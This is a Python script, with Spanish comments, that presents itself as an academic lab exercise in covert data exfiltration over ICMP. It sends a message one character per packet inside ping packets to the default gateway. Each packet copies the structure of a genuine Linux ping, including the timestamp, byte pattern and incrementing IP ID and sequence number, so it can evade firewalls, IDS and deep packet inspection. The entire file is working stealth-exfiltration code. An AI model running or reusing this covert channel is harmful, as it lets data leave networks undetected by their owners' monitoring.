#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pingv4.py - Laboratorio académico: exfiltración STEALTH vía ICMP Echo Request
Generado con asistencia de IA Generativa.

Técnica STEALTH:
- Cada paquete encubierto es CLON estructural de un ping real de Linux.
- Payload ICMP: 56 bytes exactos (igual que ping por defecto en Linux).
- 8 primeros bytes: timestamp REAL (struct timeval).
- Bytes 0x10-0x37: patrón incremental intacto (0x08-0x2f).
- Carácter cifrado inyectado en posición 0x08 (reemplaza 0x00 del patrón).
- IP ID coherente e incremental (emula asignación del kernel Linux).
- ICMP ID coherente (PID & 0xFFFF).
- ICMP Sequence Number coherente e incremental.
- Destino: gateway por defecto (visible en interfaz física eth0/wlan0).

Uso: sudo python3 pingv4.py "[MENSAJE_CIFRADO]"
"""

import os
import sys
import time
import struct
from scapy.all import IP, ICMP, Raw, sr1, send


# ---------------------------------------------------------------------------
# DETECCIÓN AUTOMÁTICA DEL GATEWAY POR DEFECTO (Linux)
# ---------------------------------------------------------------------------
def get_default_gateway():
    """Lee /proc/net/route para obtener el gateway sin dependencias externas."""
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                fields = line.strip().split()
                if fields[1] == '00000000':          # Destino 0.0.0.0 (default route)
                    gateway_hex = fields[2]           # Gateway en hex little-endian
                    gateway = '.'.join(
                        str(int(gateway_hex[i:i+2], 16)) for i in (6, 4, 2, 0)
                    )
                    return gateway
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# 1. Verificación de permisos de root (raw sockets requieren privilegios)
# ---------------------------------------------------------------------------
if os.geteuid() != 0:
    print("[ERROR] Este script debe ejecutarse con permisos de root (sudo).")
    print(f"Uso: sudo python3 {sys.argv[0]} \"[MENSAJE_CIFRADO]\"")
    sys.exit(1)

# ---------------------------------------------------------------------------
# 2. Validación de argumentos
# ---------------------------------------------------------------------------
if len(sys.argv) != 2:
    print("[ERROR] Argumento incorrecto.")
    print(f"Uso: sudo python3 {sys.argv[0]} \"[MENSAJE_CIFRADO]\"")
    sys.exit(1)

mensaje_original = sys.argv[1]
if not mensaje_original:
    print("[ERROR] El mensaje no puede estar vacío.")
    sys.exit(1)

# ---------------------------------------------------------------------------
# 3. Detección del gateway y configuración
# ---------------------------------------------------------------------------
gateway = get_default_gateway()
if not gateway:
    print("[ERROR] No se pudo detectar el gateway por defecto automáticamente.")
    print("        Verifica tu conectividad de red (ip route).")
    sys.exit(1)

HOST_DESTINO = gateway
TTL_EMULADO = 64
ICMP_ID = os.getpid() & 0xFFFF

# Contadores globales para coherencia de IP ID y ICMP Seq
g_ip_id = 1
g_icmp_seq = 1

# ---------------------------------------------------------------------------
# ADVERTENCIA DE SEGURIDAD
# ---------------------------------------------------------------------------
print("=" * 70)
print("!!! ADVERTENCIA DE SEGURIDAD !!!")
print("=" * 70)
print("Este script enviará paquetes ICMP al GATEWAY de tu red:")
print(f"    -> {HOST_DESTINO}")
print("")
print("Los paquetes SALDRÁN de tu interfaz física (eth0/wlan0) y serán")
print("visibles para: firewalls, IDS/IPS, DPI, administradores de red,")
print("y cualquier herramienta de monitoreo en la infraestructura.")
print("=" * 70)
print("")


# ---------------------------------------------------------------------------
# Funciones auxiliares
# ---------------------------------------------------------------------------

def next_ip_id():
    """Devuelve el siguiente IP ID coherente e incremental."""
    global g_ip_id
    current = g_ip_id
    g_ip_id += 1
    return current


def next_icmp_seq():
    """Devuelve el siguiente ICMP Sequence Number coherente e incremental."""
    global g_icmp_seq
    current = g_icmp_seq
    g_icmp_seq += 1
    return current


def build_payload(stealth_char=None):
    """
    Construye el payload ICMP de 56 bytes exactamente como Linux:
    - 8 bytes: timestamp real (struct timeval: tv_sec + tv_usec).
    - 48 bytes: patrón incremental.

    Si stealth_char no es None, inyecta el carácter cifrado en la
    posición 0x08 (reemplazando 0x00 del patrón), manteniendo intacto
    el patrón desde 0x10 hasta 0x37.
    """
    # Timestamp real (formato Linux x86_64: little-endian)
    now = time.time()
    tv_sec = int(now)
    tv_usec = int((now - tv_sec) * 1000000)
    timestamp = struct.pack('<II', tv_sec, tv_usec)  # 8 bytes

    # Patrón incremental de 48 bytes: 0x00, 0x01, ..., 0x2f
    patron = bytes(range(0x30))  # 48 bytes

    if stealth_char is not None:
        # Inyectar carácter en posición 0x08 (después del timestamp)
        # timestamp(8) + char(1) + patron[1:](47) = 56 bytes
        payload = timestamp + stealth_char.encode('utf-8') + patron[1:]
    else:
        # Ping real: timestamp + patrón completo
        payload = timestamp + patron  # 8 + 48 = 56 bytes

    return payload


def hex_ascii_dump(data):
    """Devuelve una representación hex + ascii del payload."""
    hex_part = data.hex(' ')
    ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
    return hex_part, ascii_part


def mostrar_campos_ip(pkt):
    """Muestra los campos de la capa IP formateados."""
    ip = pkt[IP]
    print(f"  version : {ip.version}")
    print(f"  ihl     : {ip.ihl}")
    print(f"  tos     : {ip.tos}")
    print(f"  len     : {ip.len}")
    print(f"  id      : {ip.id}")
    print(f"  flags   : {ip.flags}")
    print(f"  frag    : {ip.frag}")
    print(f"  ttl     : {ip.ttl}")
    print(f"  proto   : {ip.proto}")
    print(f"  chksum  : {ip.chksum}")
    print(f"  src     : {ip.src}")
    print(f"  dst     : {ip.dst}")


def mostrar_campos_icmp(pkt):
    """Muestra los campos de la capa ICMP formateados."""
    icmp = pkt[ICMP]
    print(f"  type    : {icmp.type}")
    print(f"  code    : {icmp.code}")
    print(f"  chksum  : {icmp.chksum}")
    print(f"  id      : {icmp.id}")
    print(f"  seq     : {icmp.seq}")
    if Raw in pkt:
        data = bytes(pkt[Raw].load)
    else:
        data = b''
    hex_part, ascii_part = hex_ascii_dump(data)
    print(f"  payload/data (hex)  : {hex_part}")
    print(f"  payload/data (ascii): {ascii_part}")
    print(f"  payload length      : {len(data)}")


def enviar_ping_real(tipo="pre"):
    """
    Envía un ping real de referencia al gateway con payload estándar de Linux.
    Muestra todos los campos IP e ICMP del paquete enviado.
    Utiliza IP ID y ICMP Seq coherentes/incrementales.
    """
    etiqueta = "PRE-TRANSMSIÓN" if tipo == "pre" else "POST-TRANSMSIÓN"
    print(f"\n[+] Enviando PING REAL de referencia ({etiqueta}) a {HOST_DESTINO}...")

    # Construcción del paquete ICMP Echo Request real (tipo 8, código 0)
    pkt = IP(dst=HOST_DESTINO, ttl=TTL_EMULADO, id=next_ip_id()) / \
          ICMP(type=8, code=0, id=ICMP_ID, seq=next_icmp_seq()) / \
          Raw(load=build_payload())

    # Forzar cálculo de checksums para mostrarlos correctamente
    pkt = pkt.__class__(bytes(pkt))

    print("  --- Capa IP ---")
    mostrar_campos_ip(pkt)
    print("  --- Capa ICMP ---")
    mostrar_campos_icmp(pkt)

    # Envío y espera de respuesta (timeout 2 segundos)
    resp = sr1(pkt, timeout=2, verbose=0)
    if resp:
        print(f"  [OK] Respuesta recibida desde {resp[IP].src}")
    else:
        print("  [AVISO] No se recibió respuesta (timeout o host no responde a ICMP).")


# ---------------------------------------------------------------------------
# 4. PING REAL de referencia (pre-transmisión)
# ---------------------------------------------------------------------------
enviar_ping_real(tipo="pre")


# ---------------------------------------------------------------------------
# 5. Modificación del mensaje: último carácter forzado a 'b'
# ---------------------------------------------------------------------------
mensaje_modificado = mensaje_original[:-1] + 'b'

print(f"\n[+] Iniciando transmisión STEALTH carácter por carácter a {HOST_DESTINO}...")
print(f"    Mensaje original : {mensaje_original}")
print(f"    Mensaje a enviar : {mensaje_modificado}")
print(f"    Total caracteres : {len(mensaje_modificado)}")
print(f"    ICMP ID emulado  : {ICMP_ID}")
print(f"    TTL emulado      : {TTL_EMULADO}")
print(f"    Técnica STEALTH  : Payload 56 bytes (timestamp 8B + patrón Linux)")
print(f"                       Carácter cifrado inyectado en posición 0x08")
print(f"                       Patrón 0x10-0x37 mantenido intacto")
print(f"                       IP ID e ICMP Seq coherentes/incrementales")
print()


# ---------------------------------------------------------------------------
# 6. Transmisión encubierta STEALTH: un paquete ICMP por cada carácter
#    Cada paquete mantiene:
#    - IP ID coherente e incremental.
#    - ICMP Seq coherente e incremental.
#    - Payload de 56 bytes con timestamp real.
#    - Patrón incremental intacto desde 0x10 hasta 0x37.
#    - Carácter cifrado inyectado en posición 0x08 del payload.
# ---------------------------------------------------------------------------
for i, char in enumerate(mensaje_modificado):
    # Construcción del paquete encubierto con payload stealth de 56 bytes
    pkt_encubierto = IP(dst=HOST_DESTINO, ttl=TTL_EMULADO, id=next_ip_id()) / \
                     ICMP(type=8, code=0, id=ICMP_ID, seq=next_icmp_seq()) / \
                     Raw(load=build_payload(stealth_char=char))

    # Forzar cálculo de checksums
    pkt_encubierto = pkt_encubierto.__class__(bytes(pkt_encubierto))

    # Envío del paquete (sin esperar respuesta)
    send(pkt_encubierto, verbose=0)

    # Formato de salida exacto solicitado
    print(".")
    print("Sent 1 packets")

    # Delay de al menos 1 segundo entre paquetes (excepto después del último)
    if i < len(mensaje_modificado) - 1:
        time.sleep(1)


# ---------------------------------------------------------------------------
# 7. PING REAL de referencia (post-transmisión)
# ---------------------------------------------------------------------------
enviar_ping_real(tipo="post")


# ---------------------------------------------------------------------------
# 8. Resumen final
# ---------------------------------------------------------------------------
print("\n" + "=" * 60)
print("RESUMEN DE OPERACIÓN")
print("=" * 60)
print(f"  Host destino           : {HOST_DESTINO} (GATEWAY)")
print(f"  Mensaje original       : {mensaje_original}")
print(f"  Caracteres enviados    : {len(mensaje_modificado)}")
print(f"  ID ICMP usado          : {ICMP_ID}")
print(f"  TTL emulado            : {TTL_EMULADO}")
print(f"  Último carácter forzado: 'b' (era '{mensaje_original[-1]}' originalmente)")
print(f"  Técnica STEALTH        : Payload 56 bytes (timestamp real + patrón Linux)")
print(f"                         : Carácter cifrado inyectado en posición 0x08")
print(f"                         : Patrón 0x10-0x37 mantenido intacto")
print(f"                         : IP ID e ICMP Seq coherentes/incrementales")
print("=" * 60)
print("[!] ADVERTENCIA: Este tráfico ha salido de la máquina hacia la red.")
